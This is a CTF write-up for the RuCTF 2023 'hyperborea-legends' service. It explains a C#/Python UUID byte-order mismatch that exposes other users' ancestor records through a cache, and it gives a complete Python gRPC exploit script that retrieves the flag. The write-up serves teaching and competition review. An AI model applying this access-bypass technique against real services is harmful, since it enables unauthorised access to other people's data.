# RuCTF 2023 | hyperborea-legends

## Description

It provides a service to store your ancestors info and simple interact with them for russes and lizards

## Unintended solutions

Unfortunately, I made a mistake when writing service that allows get flags without using alleged vulnerability... :/
The intended solution is shown below.

## Execution flow

First of all, service operated uuids in bytes between different languages: C# and Python.
String representation of uuid from bytes looks different in this languages, due to the byte order used in different language. So it "reverse" uuid (change endian) when it tranferred from C# to Python.

So there was a python script that transferred users info from database to cache. 
In user info there was info about direct ancestors (which can be user only by lizards) - list of the str uuids - this info was always missed by the cache, when used endpoint for get ancestors.

In addition, the service allowed you to create an ancestor using the entered uuid.

So the vuln was carried out by the following steps:

1. Create ancestor with "reversed" uuid of flag bearer ancestor
2. Then add created ancestor to youre direct ancestors list
3. Wait until this data is transferred into cache
4. Then you can check flag bearer ancestor info (becase this id now is in our direct ancestors list) and get the flag!

Python expoit(omitting the moments of how to connect to grpc):
```python
#!/usr/bin/env python3.11

import sys
import time
import uuid
from base64 import b64decode

import grpc

from ancestor_grpc.ancestor_pb2 import GetAncestorRequest, AncestorData, AddDirectAncestorRequest
from ancestor_grpc.ancestor_pb2_grpc import AncestorServStub
from auth_grpc.auth_pb2 import RegisterRequest, LoginRequest
from auth_grpc.auth_pb2_grpc import AutherStub

IP = sys.argv[1] if len(sys.argv) > 1 else 'localhost'
PORT = 42424
PUBLIC_FLAG_ID = b64decode(sys.argv[2]) if len(sys.argv) > 2 else ''

LE_PUBLIC_FLAG_ID = uuid.UUID(bytes=PUBLIC_FLAG_ID).bytes_le


def sploit():
    with grpc.insecure_channel(f'{IP}:{PORT}') as channel:
        auth_stub = AutherStub(channel)
        ancestor_stub = AncestorServStub(channel)

        username = str(uuid.uuid4())

        # register new user
        try:
            auth_stub.Register(RegisterRequest(username=username, password='password', species_type='FilthyLizard'))
        except grpc.RpcError:
            pass

        # login to that user
        token = auth_stub.Login(LoginRequest(username=username, password='password')).access_token
        metadata = (('authorization', f'Bearer {token}'),)

        # try to create ancestor with "reversed" uuid
        try:
            ancestor_stub.CreateAncestor(AncestorData(
                id=LE_PUBLIC_FLAG_ID,
                name='abracadabra',
                description='description',
                ancestor_type='FilthyLizard',
                burial_place='123',
            ), metadata=metadata)
        except grpc.RpcError:
            pass

        # add created ancestor to direct ancestors list
        try:
            ancestor_stub.AddDirectAncestor(AddDirectAncestorRequest(ancestor_id=LE_PUBLIC_FLAG_ID), metadata=metadata)
        except grpc.RpcError:
            pass

        # wait for ancestors list transfer to redis
        time.sleep(11)

        # now we have "reverse" of "reverse" uuid => uuid of flag, so we can see burial place of ancestor
        ancestor: AncestorData = ancestor_stub.GetAncestor(GetAncestorRequest(id=PUBLIC_FLAG_ID), metadata=metadata)
        print(ancestor.burial_place)


if __name__ == '__main__':
    sploit()
```


